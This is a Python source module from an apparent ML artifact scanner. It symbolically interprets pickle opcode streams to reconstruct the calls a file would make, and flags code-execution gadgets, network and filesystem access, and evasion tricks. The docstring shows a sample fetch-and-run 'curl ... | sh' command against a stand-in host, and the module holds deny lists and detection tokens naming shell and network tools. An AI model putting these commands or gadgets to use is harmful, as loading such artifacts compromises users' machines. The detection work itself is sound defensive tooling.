"""Symbolic Pickle interpreter — reconstructs the call graph without executing it.

``pickletools.genops`` only lists opcodes.  That is enough to say "there is a
REDUCE here", which is what most scanners report, but not enough to say *what*
the REDUCE actually calls.  This module runs the opcode stream on a symbolic
stack so a finding can name the callable and render its arguments::

    AML.PICKLE.EXEC_CALL  os.system('curl http://evil.tld/s.sh | sh')  @ byte 118

Nothing is imported, constructed or evaluated: stack values are inert
descriptions.  Reconstruction is what makes gadget chains visible, because an
attacker who hides ``os.system`` behind ``getattr(__import__('os'),'system')``
still has to spell the chain out in opcodes.
"""

from __future__ import annotations

from dataclasses import dataclass, field
import pickletools
from typing import Any

from .common import (
    MAX_PICKLE_OPCODES,
    MAX_PICKLE_STREAMS,
    finding,
    printable,
)


# ---------------------------------------------------------------------------
# Global classification
# ---------------------------------------------------------------------------
# tier -> (severity, cvss, why)
_TIERS = {
    "exec": ("critical", 9.8, "executes an operating-system command or arbitrary code"),
    "gadget": ("critical", 9.4, "is a known deserialization gadget used to reach code execution"),
    "import": ("high", 8.4, "loads arbitrary modules or native libraries at load time"),
    "network": ("high", 8.0, "opens network connections while the model loads"),
    "filesystem": ("high", 7.8, "reads, writes or deletes files while the model loads"),
    "codec": ("medium", 6.0, "decodes packed data, commonly used to unpack a payload"),
    "process": ("high", 8.2, "creates processes or threads while the model loads"),
}

_DANGEROUS: dict[tuple[str, str], str] = {}


def _register(tier: str, module: str, names: str) -> None:
    for name in names.split():
        _DANGEROUS[(module, name)] = tier


_register("exec", "os", "system popen execv execve execl execlp execvp spawnv spawnl spawnve posix_spawn")
_register("exec", "posix", "system popen execv execve spawnv")
_register("exec", "nt", "system popen execv spawnv")
_register("exec", "subprocess", "Popen run call check_call check_output getoutput getstatusoutput")
_register("exec", "builtins", "eval exec compile breakpoint")
_register("exec", "__builtin__", "eval exec compile")
_register("exec", "commands", "getoutput getstatusoutput")
_register("exec", "pty", "spawn")
_register("exec", "popen2", "popen2 popen3 popen4")
_register("exec", "platform", "popen")
_register("exec", "sh", "Command")
_register("exec", "pydoc", "pipepager tempfilepager getpager pager")
_register("exec", "code", "interact InteractiveInterpreter InteractiveConsole")
_register("exec", "codeop", "compile_command")
_register("exec", "cProfile", "run runctx")
_register("exec", "profile", "run runctx")
_register("exec", "bdb", "Bdb")
_register("exec", "pdb", "run runeval set_trace Pdb")
_register("exec", "timeit", "timeit repeat Timer")
_register("exec", "doctest", "testfile testmod script_from_examples")
_register("exec", "trace", "Trace")
_register("exec", "venv", "create EnvBuilder")
_register("exec", "setuptools.sandbox", "run_setup")
_register("exec", "pip", "main")
_register("exec", "pip._internal", "main")
_register("exec", "pip._internal.cli.main", "main")
_register("exec", "torch.hub", "load _import_module load_state_dict_from_url")
_register("exec", "numpy.testing._private.utils", "runstring")
_register("exec", "numpy.f2py.diagnose", "run_command")
_register("exec", "numpy.distutils.exec_command", "exec_command")
_register("exec", "distutils.spawn", "spawn")
_register("exec", "sysconfig", "_main")
_register("exec", "antigravity", "geohash")
_register("exec", "webbrowser", "open open_new open_new_tab get")

_register("gadget", "builtins", "getattr setattr delattr globals vars locals memoryview")
_register("gadget", "__builtin__", "getattr setattr delattr globals apply")
_register("gadget", "operator", "attrgetter methodcaller itemgetter call")
_register("gadget", "functools", "partial reduce")
_register("gadget", "types", "FunctionType CodeType MethodType LambdaType ModuleType")
_register("gadget", "marshal", "loads load")
_register("gadget", "pickle", "loads load Unpickler")
_register("gadget", "_pickle", "loads load Unpickler")
_register("gadget", "dill", "loads load")
_register("gadget", "cloudpickle", "loads load")
_register("gadget", "torch.serialization", "load _load")
_register("gadget", "torch.storage", "_load_from_bytes")
_register("gadget", "torch.jit", "load")
_register("gadget", "joblib", "load")
_register("gadget", "pandas.io.pickle", "read_pickle")
_register("gadget", "yaml", "unsafe_load load full_load")
_register("gadget", "gc", "get_objects get_referrers")

_register("import", "builtins", "__import__")
_register("import", "__builtin__", "__import__")
_register("import", "importlib", "import_module __import__ reload")
_register("import", "importlib.util", "spec_from_file_location module_from_spec")
_register("import", "imp", "load_source load_module load_dynamic new_module")
_register("import", "runpy", "run_path run_module _run_code")
_register("import", "ctypes", "CDLL WinDLL PyDLL OleDLL cdll windll pythonapi")
_register("import", "ctypes.util", "find_library")
_register("import", "cffi", "FFI dlopen")

_register("network", "socket", "socket create_connection socketpair fromfd")
_register("network", "requests", "get post put request Session")
_register("network", "requests.api", "get post request")
_register("network", "urllib.request", "urlopen urlretrieve build_opener Request")
_register("network", "urllib", "urlopen urlretrieve")
_register("network", "httpx", "get post stream Client")
_register("network", "http.client", "HTTPConnection HTTPSConnection")
_register("network", "ftplib", "FTP FTP_TLS")
_register("network", "smtplib", "SMTP SMTP_SSL")
_register("network", "telnetlib", "Telnet")
_register("network", "paramiko", "SSHClient Transport")
_register("network", "asyncio", "open_connection start_server run")

_register("filesystem", "shutil", "rmtree copyfile copytree move make_archive unpack_archive which")
_register("filesystem", "os", "remove unlink rmdir removedirs rename replace chmod chown symlink link truncate")
_register("filesystem", "os.path", "expanduser")
_register("filesystem", "builtins", "open")
_register("filesystem", "__builtin__", "open file")
_register("filesystem", "io", "open open_code FileIO")
_register("filesystem", "pathlib", "Path PosixPath WindowsPath")
_register("filesystem", "tempfile", "NamedTemporaryFile mkstemp mkdtemp")
_register("filesystem", "tarfile", "open TarFile")
_register("filesystem", "zipfile", "ZipFile PyZipFile")

_register("codec", "codecs", "encode decode getencoder getdecoder open")
_register("codec", "_codecs", "encode decode")
_register("codec", "base64", "b64decode b64encode decodebytes standard_b64decode urlsafe_b64decode")
_register("codec", "binascii", "a2b_base64 unhexlify a2b_hex")
_register("codec", "zlib", "decompress compress decompressobj")
_register("codec", "bz2", "decompress BZ2Decompressor")
_register("codec", "lzma", "decompress LZMADecompressor")
_register("codec", "gzip", "decompress GzipFile open")

_register("process", "multiprocessing", "Process Pool spawn get_context")
_register("process", "multiprocessing.context", "Process SpawnProcess")
_register("process", "threading", "Thread Timer")
_register("process", "concurrent.futures", "ProcessPoolExecutor ThreadPoolExecutor")
_register("process", "signal", "signal setitimer")
_register("process", "atexit", "register")

# Globals expected inside legitimate ML pickles.  Presence alone is not a
# finding; they are still recorded in the inventory.
_EXPECTED_PREFIXES = (
    "torch._utils.",
    "torch.nn.",
    "torch.storage._",
    "torch.FloatStorage",
    "collections.OrderedDict",
    "collections.defaultdict",
    "numpy.core.multiarray._reconstruct",
    "numpy.core.multiarray.scalar",
    "numpy.ndarray",
    "numpy.dtype",
    "sklearn.",
    "scipy.sparse.",
    "pandas.core.",
    "transformers.",
    "tokenizers.",
    "argparse.Namespace",
)

_SUSPICIOUS_ARGUMENT_TOKENS = (
    "http://", "https://", "/bin/", "cmd.exe", "powershell", "curl ", "wget ",
    "base64", "chmod +x", "nc ", "bash -", "sh -c", "|sh", "| sh", "socket",
    "import os", "__import__", "eval(", "exec(", "authorized_keys",
    "/tmp/",  # nosec B108 - detection signature, not a path this process uses
    "\\windows\\", "reg add", "schtasks",
)


class _Mark:
    __slots__ = ()

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return "<MARK>"


MARK = _Mark()


@dataclass
class Sym:
    """A symbolic pickle stack value."""

    kind: str
    value: Any = None
    module: str = ""
    name: str = ""
    args: tuple = ()
    offset: int = -1

    def render(self, depth: int = 0) -> str:
        if depth > 4:
            return "..."
        if self.kind == "global":
            return f"{self.module}.{self.name}"
        if self.kind == "const":
            return _render_const(self.value)
        if self.kind == "tuple":
            inner = ", ".join(item.render(depth + 1) for item in self.args)
            return f"({inner})"
        if self.kind == "list":
            inner = ", ".join(item.render(depth + 1) for item in self.args[:6])
            return f"[{inner}]"
        if self.kind == "call":
            callee = self.value.render(depth + 1) if isinstance(self.value, Sym) else "?"
            inner = ", ".join(item.render(depth + 1) for item in self.args)
            return f"{callee}({inner})"
        if self.kind == "dict":
            return "{...}"
        return "?"

    @property
    def qualified(self) -> str:
        return f"{self.module}.{self.name}" if self.kind == "global" else ""


def _render_const(value: Any) -> str:
    if isinstance(value, (bytes, bytearray)):
        return repr(printable(bytes(value), 120))
    if isinstance(value, str):
        return repr(printable(value, 120))
    return repr(value)[:120]


def _const(value: Any, offset: int = -1) -> Sym:
    return Sym("const", value=value, offset=offset)


@dataclass
class PickleAnalysis:
    findings: list[dict[str, Any]] = field(default_factory=list)
    globals_seen: list[str] = field(default_factory=list)
    calls: list[str] = field(default_factory=list)
    opcode_count: int = 0
    streams: int = 0
    reduce_count: int = 0
    protocol: int = 0
    truncated: bool = False
    consumed: int = 0

    def metadata(self) -> dict[str, Any]:
        return {
            "opcode_count": self.opcode_count,
            "streams": self.streams,
            "reduce_count": self.reduce_count,
            "protocol": self.protocol,
            "global_references": self.globals_seen[:200],
            "reconstructed_calls": self.calls[:64],
            "truncated": self.truncated,
        }


def analyze(data: bytes, *, source: str = "", base_offset: int = 0) -> PickleAnalysis:
    """Symbolically interpret one or more concatenated pickle streams."""
    analysis = PickleAnalysis()
    seen_globals: set[str] = set()
    reported: set[tuple[str, str]] = set()
    cursor = 0
    length = len(data)

    while cursor < length and analysis.streams < MAX_PICKLE_STREAMS:
        while cursor < length and data[cursor] in b"\x00 \t\r\n":
            cursor += 1
        if cursor >= length:
            break
        analysis.streams += 1
        stack: list[Any] = []
        memo: dict[int, Any] = {}
        next_memo = 0
        stopped = False
        last_position = -1
        try:
            for opcode, argument, position in pickletools.genops(data[cursor:]):
                analysis.opcode_count += 1
                last_position = position
                if analysis.opcode_count > MAX_PICKLE_OPCODES:
                    analysis.truncated = True
                    analysis.findings.append(
                        finding(
                            "AML.PICKLE.OPCODE_LIMIT", "high", 7.0,
                            "Pickle opcode count exceeded the analysis limit.",
                            category="coverage", location=source,
                        )
                    )
                    analysis.consumed = length
                    return analysis
                absolute = base_offset + cursor + position
                name = opcode.name
                if name == "STOP":
                    stopped = True
                    break
                _step(
                    name, argument, absolute, stack, memo,
                    analysis, seen_globals, reported, source,
                )
                if name == "MEMOIZE":
                    memo[next_memo] = stack[-1] if stack else None
                    next_memo += 1
                elif name in {"PUT", "BINPUT", "LONG_BINPUT"}:
                    try:
                        index = int(argument)
                    except (TypeError, ValueError):
                        index = next_memo
                    memo[index] = stack[-1] if stack else None
                    next_memo = max(next_memo, index + 1)
        except Exception as error:  # pragma: no cover - malformed input path
            analysis.findings.append(
                finding(
                    "AML.PICKLE.PARSER", "high", 7.0,
                    f"Pickle opcode stream is malformed at byte "
                    f"{base_offset + cursor}: {str(error)[:160]}.",
                    category="deserialization", location=source,
                    byte_offsets=[base_offset + cursor],
                    remediation="A malformed pickle cannot be cleared; reject the artifact.",
                )
            )
            break
        if not stopped or last_position < 0:
            break
        cursor += last_position + 1

    analysis.consumed = cursor
    if cursor < length and analysis.streams >= MAX_PICKLE_STREAMS:
        analysis.truncated = True
        analysis.findings.append(
            finding(
                "AML.PICKLE.STREAM_LIMIT", "high", 7.0,
                f"Artifact contains more than {MAX_PICKLE_STREAMS} concatenated pickle streams.",
                category="coverage", location=source,
            )
        )
    elif analysis.streams > 1:
        analysis.findings.append(
            finding(
                "AML.PICKLE.MULTI_STREAM", "high", 7.4,
                f"{analysis.streams} pickle streams are concatenated in one payload; "
                "loaders read the first and ignore the rest, which hides the others from review.",
                category="evasion", location=source,
                remediation="Reject artifacts that carry more than one serialized object.",
            )
        )
    if cursor < length and not analysis.truncated:
        trailing = length - cursor
        if trailing > 8:
            analysis.findings.append(
                finding(
                    "AML.PICKLE.TRAILING_DATA", "medium", 6.2,
                    f"{trailing:,} bytes follow the final pickle STOP opcode.",
                    category="evasion", location=source,
                    byte_offsets=[base_offset + cursor],
                    remediation="Trailing data is never required; treat it as smuggled content.",
                )
            )
    analysis.globals_seen = sorted(seen_globals)
    return analysis


def _step(
    name: str,
    argument: Any,
    absolute: int,
    stack: list[Any],
    memo: dict[int, Any],
    analysis: PickleAnalysis,
    seen_globals: set[str],
    reported: set[tuple[str, str]],
    source: str,
) -> None:
    if name in {"PROTO", "FRAME"}:
        if name == "PROTO":
            try:
                analysis.protocol = int(argument)
            except (TypeError, ValueError):
                analysis.protocol = 0
        return
    if name == "MARK":
        stack.append(MARK)
        return
    if name in {
        "INT", "BININT", "BININT1", "BININT2", "LONG", "LONG1", "LONG4",
        "FLOAT", "BINFLOAT", "STRING", "BINSTRING", "SHORT_BINSTRING",
        "BINBYTES", "SHORT_BINBYTES", "BINBYTES8", "UNICODE", "BINUNICODE",
        "SHORT_BINUNICODE", "BINUNICODE8", "BYTEARRAY8",
    }:
        stack.append(_const(argument, absolute))
        return
    if name == "NONE":
        stack.append(_const(None, absolute))
        return
    if name in {"NEWTRUE", "NEWFALSE"}:
        stack.append(_const(name == "NEWTRUE", absolute))
        return
    if name in {"EMPTY_LIST", "EMPTY_SET"}:
        stack.append(Sym("list", offset=absolute))
        return
    if name == "EMPTY_DICT":
        stack.append(Sym("dict", offset=absolute))
        return
    if name == "EMPTY_TUPLE":
        stack.append(Sym("tuple", args=(), offset=absolute))
        return
    if name in {"TUPLE1", "TUPLE2", "TUPLE3"}:
        count = int(name[-1])
        items = _pop_many(stack, count)
        stack.append(Sym("tuple", args=tuple(items), offset=absolute))
        return
    if name in {"TUPLE", "LIST", "DICT", "FROZENSET"}:
        items = _pop_to_mark(stack)
        kind = "tuple" if name in {"TUPLE", "FROZENSET"} else ("list" if name == "LIST" else "dict")
        stack.append(Sym(kind, args=tuple(items), offset=absolute))
        return
    if name in {"APPEND", "SETITEM"}:
        _pop_many(stack, 1 if name == "APPEND" else 2)
        return
    if name in {"APPENDS", "SETITEMS", "ADDITEMS"}:
        _pop_to_mark(stack)
        return
    if name in {"GET", "BINGET", "LONG_BINGET"}:
        try:
            stack.append(memo.get(int(argument), Sym("unknown", offset=absolute)))
        except (TypeError, ValueError):
            stack.append(Sym("unknown", offset=absolute))
        return
    if name in {"POP", "DUP"}:
        if name == "POP" and stack:
            stack.pop()
        elif name == "DUP" and stack:
            stack.append(stack[-1])
        return
    if name == "POP_MARK":
        _pop_to_mark(stack)
        return
    if name in {"PERSID", "BINPERSID"}:
        if name == "BINPERSID" and stack:
            stack.pop()
        stack.append(Sym("unknown", offset=absolute))
        return
    if name in {"NEXT_BUFFER", "READONLY_BUFFER"}:
        if name == "READONLY_BUFFER" and stack:
            stack.pop()
        stack.append(Sym("unknown", offset=absolute))
        return
    if name in {"GLOBAL", "INST", "STACK_GLOBAL"}:
        module, attribute = _resolve_global(name, argument, stack)
        symbol = Sym("global", module=module, name=attribute, offset=absolute)
        if module or attribute:
            seen_globals.add(f"{module}.{attribute}")
            _classify(module, attribute, absolute, analysis, reported, source)
        if name == "INST":
            items = _pop_to_mark(stack)
            call = Sym("call", value=symbol, args=tuple(items), offset=absolute)
            _record_call(call, absolute, analysis, source)
            stack.append(call)
        else:
            stack.append(symbol)
        return
    if name in {"EXT1", "EXT2", "EXT4"}:
        analysis.findings.append(
            finding(
                "AML.PICKLE.EXTENSION", "high", 7.5,
                f"Pickle extension-registry opcode resolves an out-of-band object "
                f"(code {argument}) at byte {absolute}.",
                category="deserialization", location=source, byte_offsets=[absolute],
            )
        )
        stack.append(Sym("unknown", offset=absolute))
        return
    if name == "REDUCE":
        analysis.reduce_count += 1
        arguments = stack.pop() if stack else Sym("unknown")
        callable_symbol = stack.pop() if stack else Sym("unknown")
        args = arguments.args if isinstance(arguments, Sym) and arguments.kind == "tuple" else ()
        call = Sym("call", value=callable_symbol, args=tuple(args), offset=absolute)
        _record_call(call, absolute, analysis, source)
        stack.append(call)
        return
    if name in {"NEWOBJ", "NEWOBJ_EX"}:
        if name == "NEWOBJ_EX":
            _pop_many(stack, 2)
        else:
            _pop_many(stack, 1)
        callable_symbol = stack.pop() if stack else Sym("unknown")
        call = Sym("call", value=callable_symbol, args=(), offset=absolute)
        _record_call(call, absolute, analysis, source)
        stack.append(call)
        return
    if name == "OBJ":
        items = _pop_to_mark(stack)
        callable_symbol = items[0] if items else Sym("unknown")
        call = Sym("call", value=callable_symbol, args=tuple(items[1:]), offset=absolute)
        _record_call(call, absolute, analysis, source)
        stack.append(call)
        return
    if name == "BUILD":
        state = stack.pop() if stack else Sym("unknown")
        target = stack[-1] if stack else Sym("unknown")
        rendered = target.render() if isinstance(target, Sym) else "?"
        analysis.findings.append(
            finding(
                "AML.PICKLE.BUILD", "medium", 6.0,
                f"Pickle BUILD invokes __setstate__ on {rendered} at byte {absolute}.",
                category="deserialization", location=source, byte_offsets=[absolute],
                remediation="Verify the class __setstate__ implementation before loading.",
                confidence="medium",
            )
        )
        if isinstance(state, Sym) and state.kind == "call":
            _record_call(state, absolute, analysis, source)
        return


def _pop_many(stack: list[Any], count: int) -> list[Sym]:
    items: list[Sym] = []
    for _ in range(count):
        value = stack.pop() if stack else Sym("unknown")
        items.append(value if isinstance(value, Sym) else Sym("unknown"))
    items.reverse()
    return items


def _pop_to_mark(stack: list[Any]) -> list[Sym]:
    items: list[Sym] = []
    while stack:
        value = stack.pop()
        if value is MARK:
            break
        items.append(value if isinstance(value, Sym) else Sym("unknown"))
    items.reverse()
    return items


def _resolve_global(name: str, argument: Any, stack: list[Any]) -> tuple[str, str]:
    if name == "STACK_GLOBAL":
        attribute = stack.pop() if stack else None
        module = stack.pop() if stack else None
        return (_text(module), _text(attribute))
    text = argument if isinstance(argument, str) else _text(argument)
    if isinstance(text, str) and " " in text:
        module, _, attribute = text.partition(" ")
        return module.strip(), attribute.strip()
    return (text or "").strip(), ""


def _text(value: Any) -> str:
    if isinstance(value, Sym):
        if value.kind == "const":
            return _text(value.value)
        return ""
    if isinstance(value, (bytes, bytearray)):
        return bytes(value).decode("utf-8", "replace")
    if isinstance(value, str):
        return value
    return ""


def _classify(
    module: str,
    attribute: str,
    absolute: int,
    analysis: PickleAnalysis,
    reported: set[tuple[str, str]],
    source: str,
) -> None:
    key = (module, attribute)
    if key in reported:
        return
    reported.add(key)
    tier = _DANGEROUS.get(key)
    if tier is None:
        # A submodule reference such as ``os.path`` used with a dangerous name.
        tier = _DANGEROUS.get((module.split(".")[0], attribute))
    if tier is None:
        qualified = f"{module}.{attribute}"
        if not any(qualified.startswith(prefix) for prefix in _EXPECTED_PREFIXES):
            analysis.findings.append(
                finding(
                    "AML.PICKLE.UNEXPECTED_GLOBAL", "low", 3.5,
                    f"Pickle resolves {qualified} at byte {absolute}, which is outside "
                    "the expected machine-learning import surface.",
                    category="deserialization", location=source, byte_offsets=[absolute],
                    remediation="Confirm the symbol belongs to the model framework.",
                    confidence="low",
                )
            )
        return
    severity, cvss, why = _TIERS[tier]
    analysis.findings.append(
        finding(
            f"AML.PICKLE.GLOBAL.{tier.upper()}", severity, cvss,
            f"Pickle resolves {module}.{attribute} at byte {absolute}, which {why}.",
            category="code_execution" if tier in {"exec", "gadget", "import"} else tier,
            location=source, byte_offsets=[absolute],
            remediation="Never load this artifact; convert a verified source model to SafeTensors.",
            attack=("AML.T0010", "AML.T0011"), cwe=("CWE-502",),
        )
    )


def _record_call(call: Sym, absolute: int, analysis: PickleAnalysis, source: str) -> None:
    rendered = call.render()
    if len(analysis.calls) < 256 and rendered not in analysis.calls:
        analysis.calls.append(rendered)
    callee = call.value if isinstance(call.value, Sym) else None
    tier = None
    if callee is not None and callee.kind == "global":
        tier = _DANGEROUS.get((callee.module, callee.name))
        if tier is None:
            tier = _DANGEROUS.get((callee.module.split(".")[0], callee.name))
    lowered = rendered.lower()
    suspicious = [token for token in _SUSPICIOUS_ARGUMENT_TOKENS if token in lowered]
    if tier in {"exec", "gadget", "import", "network"}:
        analysis.findings.append(
            finding(
                "AML.PICKLE.EXEC_CALL", "critical", 10.0 if tier == "exec" else 9.5,
                f"Pickle reconstructs the call {rendered[:200]} at byte {absolute}; "
                "loading the artifact runs it.",
                category="code_execution", location=source, byte_offsets=[absolute],
                evidence=[rendered[:400]],
                remediation="Quarantine the artifact and report the source repository.",
                attack=("AML.T0010", "AML.T0011"), cwe=("CWE-502",),
            )
        )
    elif suspicious and callee is not None and callee.kind == "global":
        analysis.findings.append(
            finding(
                "AML.PICKLE.SUSPICIOUS_ARGUMENT", "high", 8.0,
                f"Pickle call {rendered[:160]} at byte {absolute} carries "
                f"operationally suspicious arguments ({', '.join(suspicious[:3])}).",
                category="deserialization", location=source, byte_offsets=[absolute],
                evidence=[rendered[:400]], confidence="medium",
                remediation="Review the reconstructed call before loading.",
            )
        )
